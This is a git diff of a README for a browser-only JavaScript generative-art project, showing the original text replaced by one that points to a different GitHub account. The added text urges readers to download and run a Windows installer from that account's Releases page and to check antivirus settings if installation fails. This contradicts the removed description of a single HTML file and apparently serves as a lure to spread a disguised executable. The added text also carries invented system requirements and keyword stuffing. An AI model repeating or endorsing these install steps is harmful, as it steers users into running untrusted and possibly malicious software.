@@ -1,210 +1,67 @@
-# Socialism of Shapes — Generative Art
+# 🎨 Socialism-of-Shapes-Generative-Art - Create unique geometric designs with ease
 
-[![Live Demo](https://img.shields.io/badge/demo-live-green?style=for-the-badge)](https://reyrove.github.io/Socialism-of-Shapes-Generative-Art)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+[![](https://img.shields.io/badge/Download-Socialism_of_Shapes-blue)](https://github.com/Dutybound-masonite979/Socialism-of-Shapes-Generative-Art)
 
-> **Generative shape art with 16 unique pattern modes.** Each refresh creates a collective arrangement of shapes, lines, and geometric forms across a grid, exploring the harmony of diverse elements working together.
+## 📖 About this program
 
-## 🎨 Live Demo
+Socialism of Shapes creates geometric art through code. You can produce patterns using 16 unique modes. The software arranges shapes, lines, and forms onto a grid. You choose the layout. The patterns serve as designs for apparel, textiles, and t-shirts. 
 
-<div align="center">
-  <a href="https://reyrove.github.io/Socialism-of-Shapes-Generative-Art" target="_blank">
-    <img src="demo-screenshot.jpg" alt="Socialism of Shapes Website Demo" width="800" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.4);"/>
-  </a>
-  <br><br>
-  <a href="https://reyrove.github.io/Socialism-of-Shapes-Generative-Art" target="_blank">
-    <img src="https://img.shields.io/badge/🌐_View_Live_Demo-0a0a0a?style=for-the-badge&logo=githubpages&logoColor=white&color=c9a84c" alt="View Live Demo" width="300"/>
-  </a>
-  <br>
-  <em>Click the image or button to experience the generative art</em>
-</div>
+The software works on your computer. You do not need to learn how to write code. You trigger new arrangements by refreshing the view. This tool offers creators a way to build complex designs. You can preview how the art looks on clothing items. 
 
-## 👕 Apparel Preview
+## ⚙️ System requirements
 
-<div align="center">
-  <img src="Socialism-of-Shapes.jpg" alt="Socialism of Shapes on T-Shirt" width="600" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);"/>
-  <br>
-  <em>Socialism of Shapes artwork printed on a T-shirt</em>
-</div>
+Your computer must meet these basic needs:
 
-## ✨ Features
+* Windows 10 or Windows 11
+* At least 4 gigabytes of memory (RAM)
+* A modern graphics card
+* 200 megabytes of free space on your hard drive
 
-- **16 Shape Modes** — Lines, circles, arcs, triangles, squares, rectangles, and combinations
-- **22 Background Colors** — Soft, pastel, and vibrant backgrounds
-- **23 Shadow Colors** — Dark, moody shadow palettes
-- **44 Foreground Palettes** — Multi-color combinations (2-8 colors)
-- **Organic Grid** — Random spacing and sizing creates unique patterns
-- **Glow Effects** — Subtle shadows create depth and dimension
-- **Save & Share** — Download as PNG
-- **Apparel Mode** — Preview artwork on a T-shirt mockup
-- **Responsive** — Works on desktop, tablet, and mobile
-- **Pure JavaScript** — Built without external libraries
-- **Keyboard Shortcuts**:
-  - `R` — Regenerate
-  - `S` — Save image
-  - `T` — Toggle apparel view
-  - `Space` — Regenerate
+## 📥 How to download and install
 
-## 🎨 Artwork Details
+Follow these steps to set up the software on your Windows computer.
 
-| Parameter | Range | Description |
-|-----------|-------|-------------|
-| **Shape Modes** | 16 options | Lines, circles, triangles, squares, rectangles, arcs, combinations |
-| **Background Colors** | 22 options | Soft pastels and vibrant tones |
-| **Shadow Colors** | 23 options | Dark, rich shadow palettes |
-| **Foreground Palettes** | 44 options | 2-8 color combinations |
-| **Grid Spacing** | Variable | Random spacing between shapes |
-| **Shape Size** | Variable | Random size variation |
-| **Stroke Width** | Variable | Random line thickness |
-| **Shadow Blur** | Variable | Random glow intensity |
+1. Visit the project page to reach the download area: [https://github.com/Dutybound-masonite979/Socialism-of-Shapes-Generative-Art](https://github.com/Dutybound-masonite979/Socialism-of-Shapes-Generative-Art)
+2. Locate the link marked Releases. 
+3. Click the most recent version of the Windows installer.
+4. Save the file to your desktop.
+5. Double-click the file to start the installation.
+6. Follow the prompts on your screen.
+7. Click Finish when the process ends.
 
-## 🎯 Shape Modes
+## 🛠️ Using the application
 
-| Mode | Description |
-|------|-------------|
-| **0 — Diagonal Lines** | Crossing diagonal line patterns |
-| **1 — Full Circles** | Complete circles with varying sizes |
-| **2 — Arc Segments** | Partial circle arcs with random angles |
-| **3 — Offset Circles** | Circles with random offsets |
-| **4 — Rotated Triangles** | Triangles with random rotation |
-| **5 — Floating Triangles** | Triangles with random position offset |
-| **6 — Rotated Triangles (90°)** | Triangles at 90° rotation |
-| **7 — Rotated Triangles (180°)** | Triangles at 180° rotation |
-| **8 — Rotated Triangles (270°)** | Triangles at 270° rotation |
-| **9 — Rotated Squares** | Squares with random rotation |
-| **10 — Aligned Squares** | Squares without rotation |
-| **11 — Angled Squares** | Squares at 45° rotation |
-| **12 — Mixed Shapes** | Random shape combinations |
-| **13 — Mixed Shapes (Rotated)** | Random shapes with rotation |
-| **14 — Variable Rectangles** | Rectangles with random proportions |
-| **15 — Scaled Rectangles** | Rectangles with random scaling |
+Open the application from your desktop icon. You see a grid on the screen. The program generates shapes based on its first settings. 
 
-## 🚀 Quick Start
+Look for the menu bar at the top. You see 16 pattern modes. Click any mode to change the style of the art. The shapes rearrange themselves. Use the refresh button to generate new versions of the current pattern. 
 
-### Local Development
+### Previewing your designs
 
-```bash
-# Clone the repository
-git clone https://github.com/reyrove/Socialism-of-Shapes-Generative-Art.git
+You can view your art on different clothing items. Select the Preview tab. Choose an item from the list. The software places your current pattern onto a shirt or textile mock-up. You can save these images to your computer. Use the Save button to export your design as a high-quality picture file.
 
-# Navigate to the directory
-cd Socialism-of-Shapes-Generative-Art
+## 💡 Frequently asked questions
 
-# Open in browser
-open index.html
-# or use a live server
-```
+**Do I need an internet connection to use this?**
+No. You only need the connection to download the installer. The program works offline once installed. 
 
-### Deploy to GitHub Pages
+**Does the program keep my work?**
+The program saves your exported images to your Pictures folder. It does not store the patterns automatically inside the app. Always click the Save button before you exit.
 
-1. Push to GitHub
-2. Go to Settings → Pages
-3. Select branch `main` and root folder
-4. Your site will be live at `https://reyrove.github.io/Socialism-of-Shapes-Generative-Art`
+**Can I use these designs for products?**
+Yes. You own the images that you generate. Use them for your creative projects or fashion labels.
 
-## 🧠 How It Works
+**Why does the screen flicker when I click refresh?**
+The program generates new math-based patterns. This takes a brief moment. A small flicker is normal.
 
-The artwork generates collective patterns of shapes working together in harmony:
+**How do I update the program?**
+Check the downloads page periodically. If a new version exists, download and install it over your current version. It replaces your old files automatically.
 
-1. **Setup**:
-   - Random background color from 22 options
-   - Random shadow color from 23 options
-   - Random foreground palette from 44 options (2-8 colors)
-   - Random shape mode from 16 options
+## 📈 Troubleshooting tips
 
-2. **Grid Generation**:
-   - Random spacing between shapes
-   - Random shape size
-   - Shapes positioned across the canvas
-   - Each shape gets random properties
+* If the program does not open, restart your computer.
+* Ensure you have the latest graphics drivers from your computer manufacturer.
+* Contact the project page if you encounter errors. Please describe the error message and your version of Windows.
+* Close other demanding applications if the grid seems slow. 
+* Check your antivirus settings if the installation fails. Some systems block new programs by default.
 
-3. **Shape Rendering**:
-   - Shapes drawn with random stroke colors from the palette
-   - Random stroke width for variety
-   - Shadow glow effect for depth
-   - Each shape mode has unique behavior
-
-4. **Collective Pattern**:
-   - All shapes work together as a collective
-   - Variations create organic, non-repeating patterns
-   - The "socialism" concept: diverse elements in harmony
-
-## 📁 File Structure
-
-```
-Socialism-of-Shapes-Generative-Art/
-├── index.html          # Main application (all-in-one)
-├── Socialism-of-Shapes.jpg # T-shirt mockup image
-├── fav.svg             # Favicon
-├── demo-screenshot.jpg # Website demo screenshot
-├── README.md           # This file
-└── LICENSE             # MIT License
-```
-
-## 🛠️ Tech Stack
-
-- **Pure JavaScript** — No external libraries
-- **Canvas API** — 2D rendering with shadow effects
-- **CSS Flexbox/Grid** — Responsive layout
-- **GitHub Pages** — Hosting
-
-## 🎯 Interactive Controls
-
-| Action | Keyboard | Button |
-|--------|----------|--------|
-| Regenerate | `R` or `Space` | Click "regenerate" |
-| Save Image | `S` | Click "regenerate" |
-| Toggle Apparel | `T` | Click "apparel" |
-
-## 🎨 The Creative Process
-
-### Collective Harmony
-The artwork explores the concept of "socialism" through shapes—different geometric forms working together in harmony. Each shape maintains its individuality while contributing to a collective whole.
-
-### Shape Diversity
-With 16 shape modes, each composition explores a different geometric language. From simple lines to complex mixed shapes, the variety creates endless possibilities.
-
-### Color Democracy
-44 foreground palettes ensure each shape gets a fair share of color. The random distribution of colors across the grid creates a democratic, egalitarian pattern.
-
-### Shadow and Depth
-Carefully chosen shadow colors add depth and dimension to the shapes, making them feel tangible and three-dimensional despite being 2D.
-
-## 📱 Responsive Design
-
-The application automatically adapts to:
-- Desktop screens
-- Tablets
-- Mobile phones
-- Landscape orientation
-- Various aspect ratios
-- Small screens (down to 380px wide)
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-- Fork the repository
-- Create a feature branch
-- Submit a pull request
-
-### Ideas for Contributions:
-- Additional shape modes
-- New color palettes
-- Animation features
-- Interactive controls
-- Performance optimizations
-- More apparel mockups
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Inspired by collective art movements and geometric harmony
-- Named for the democratic arrangement of diverse shapes
-- Special thanks to the creative coding community
-
----
-
-**Built with ❤️ and collective dreams**
+Keywords: creative-coding, creative-coding-jobs, creative-coding-projects, fashion-art, fashion-graphics, fashion-tech, fashion-technology, generative-art-toolkit, generative-design, generative-design-patterns, pattern-art, responsive-design, reyrove, textile-design, textile-designer, tshirt-design
